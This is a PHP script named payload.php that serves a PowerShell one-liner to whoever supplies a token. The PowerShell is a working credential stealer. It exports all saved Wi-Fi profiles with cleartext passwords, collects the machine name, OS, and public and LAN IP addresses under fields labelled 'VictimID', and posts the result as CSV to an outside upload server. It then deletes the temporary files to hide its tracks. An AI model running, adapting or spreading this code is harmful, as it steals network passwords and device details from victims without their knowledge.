<?php
/* payload.php – returns the correct PowerShell command for a given token */
$token = $_GET['token'] ?? '';
if (empty($token)) {
    http_response_code(403);
    exit('Access Denied: Missing token.');
}

$safe = htmlspecialchars($token, ENT_QUOTES, 'UTF-8');

$ps = <<<PS
\$u='https://narain.udhees.com/upload.php?token={$safe}';\$t=\$env:TEMP;netsh wlan export profile folder="\$t" key=clear > \$null;\$os=(Get-CimInstance Win32_OperatingSystem).Caption;\$victimId=\$env:COMPUTERNAME;try{\$pub=(Invoke-WebRequest -UseBasicParsing 'https://api.ipify.org' -TimeoutSec 3).Content.Trim()}catch{\$pub='(unknown)'};\$defaultRoute=Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue|Sort-Object RouteMetric|Select-Object -First 1;if(\$defaultRoute){\$ifIndex=\$defaultRoute.InterfaceIndex;\$lanObj=Get-NetIPAddress -AddressFamily IPv4 -InterfaceIndex \$ifIndex -ErrorAction SilentlyContinue|Where-Object{\$_.IPAddress -notlike '169.254*' -and \$_.IPAddress -notlike '127.0.0.1'}|Select-Object -First 1}else{\$lanObj=\$null};if(\$lanObj){\$lan=\$lanObj.IPAddress}else{\$lan='(unknown)'};\$ts=(Get-Date -f 'yyyy-MM-dd HH:mm:ss');\$items=@();Get-ChildItem "\$t\Wi-Fi-*.xml"|ForEach-Object{\$x=[xml](Get-Content \$_.FullName);\$s=\$x.WLANProfile.SSIDConfig.SSID.name;\$p=\$x.WLANProfile.MSM.security.sharedKey.keyMaterial;\$items+=[pscustomobject]@{Time=\$ts;VictimID=\$victimId;SSID=\$s;Password=if(\$p){\$p}else{''};VictimLANIP=\$lan;VictimOS=\$os;PublicIP=\$pub;LANExtra='N/A';Latitude='N/A';Longitude='N/A';PacketSummary=''};Remove-Item \$_.FullName -ErrorAction SilentlyContinue};if(\$items){\$csv="\$t\w.csv";\$items|Export-Csv \$csv -NoTypeInformation;Invoke-WebRequest -UseBasicParsing -Uri \$u -Method Post -Body (Get-Content \$csv -Raw);Remove-Item \$csv -ErrorAction SilentlyContinue};exit
PS;

header('Content-Type: text/plain; charset=utf-8');
echo $ps;
?>
